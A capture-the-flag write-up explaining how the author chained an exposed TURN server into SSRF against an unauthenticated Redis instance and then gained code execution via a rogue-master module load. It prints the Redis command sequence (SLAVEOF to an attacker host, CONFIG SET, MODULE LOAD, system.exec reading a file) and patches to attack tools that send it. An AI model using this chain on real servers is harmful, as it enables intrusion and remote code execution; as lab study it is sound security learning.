### 0x00 Challenge

supervisord.conf:

```
[supervisord]
nodaemon=true

[program:gunicorn3]
command=gunicorn3 --workers=10 -b 0.0.0.0:5000 app:app
autorestart=true
user=www

[program:coturn]
command=turnserver
autorestart=true
user=www

[program:redis]
command=timeout 60s redis-server --bind 0.0.0.0
autorestart=true
user=www
```

Dockerfile:

```
FROM ubuntu:18.04

RUN adduser --disabled-password --gecos '' www

RUN apt-get update && apt-get install -y coturn redis python3 python3-pip gunicorn3 supervisor

WORKDIR app
COPY requirements.txt .
RUN pip3 install -r requirements.txt

COPY flag.txt /
RUN chmod 444 /flag.txt

COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
RUN echo 'min-port=49000' >> /etc/turnserver.conf
RUN echo 'max-port=49100' >> /etc/turnserver.conf

COPY app.py .
COPY static static

EXPOSE 3478
EXPOSE 5000

CMD ["supervisord"]
```

app.py is indeed just a red herring so I am not gonna put it here.

### 0x01 Thoughts

Obviously, following line in supervisord config file is suspicious:

```
command=timeout 60s redis-server --bind 0.0.0.0
```

Every security guy should know *never bind redis server to 0.0.0.0*. Additionally, no password is set for this redis server, which implies this challenge is likely related to SSRF. 

And by some chance, I do recall that TURN server could lead to some internal network magics. So, I started to do Googling and found https://hackerone.com/reports/333419. Unfortunately, the report's author is so bad that only a pcap file of pwning TURN server is provided. I have replayed these TCP packets and tried different clients, but none worked. Indeed, I spent ~8 hours on patching https://github.com/pion/turn/ and finally gave up. 

Nonetheless,

**After attempting other challenges, I discovered the pattern of this whole CTF**: 

![](https://quicklatex.com/cache3/93/ql_41c595e88f3ff92942c14e1013b44593_l3.png)

### 0x02: SSRF

https://github.com/staaldraad/turner finally works for being an HTTP proxy based on TURN server. However, we somehow need to send TCP packets so as to interact with redis server. 

So, being lazy enough, I applied the following change to L106 for `main.go` to send TCP messages to redis server.

```
-   methodLine := fmt.Sprintf("%s %s %s\r\n", r.Method, r.URL.Path, r.Proto)
+   methodLine := fmt.Sprintf("INFO\r\n")
```

And added the following line after L158 to print the response:

```
+   fmt.Println(string(buf[:n]))
```

Then, run this script in terminal (`go build && ./turner -server web.chal.csaw.io:3478`) and set the browser proxy to `127.0.0.1:8080`. By visiting `0.0.0.0:6379`, you can find the information of redis server on the terminal. 

### 0x03: RCE

Since the version of redis server in the docker container is 4.x, we can apply this script: https://github.com/n0b0dyCN/redis-rogue-server

However, since I was too lazy to convert the former HTTP proxy to a socks proxy, I directly dumped the commands sent to the redis server by this RCE script:

```
SLAVEOF [YOUR_ROGUE_SERVER_ADDR] 21000
CONFIG SET dbfilename exp.so
MODULE LOAD ./exp.so
system.exec 'cat /flag.txt'
```

And patched the RCE script at L218 to make it only as a fake master server (rogue server):

```
-   try:
-      runserver(options.rh, options.rp, options.lh, options.lp)
-   except Exception as e:
-      error(repr(e))
+   rogue = RogueServer(options.lh, options.lp)
+   rogue.exp()
```

Then, I again applied the change to L106 for `main.go` in turner:

```
-   methodLine := fmt.Sprintf("INFO\r\n")
+   methodLine := fmt.Sprintf("SLAVEOF [YOUR_ROGUE_SERVER_ADDR] 21000\r\nCONFIG SET dbfilename exp.so\r\nMODULE LOAD ./exp.so\r\nsystem.exec 'cat /flag.txt'\r\n")
```

Finally, run this script again in terminal (`go build && ./turner -server web.chal.csaw.io:3478`) and set the browser proxy to `127.0.0.1:8080`. By visiting `0.0.0.0:6379` and in the meantime constantly restarting rogue server, you can find the flag on the terminal. 

`flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}`
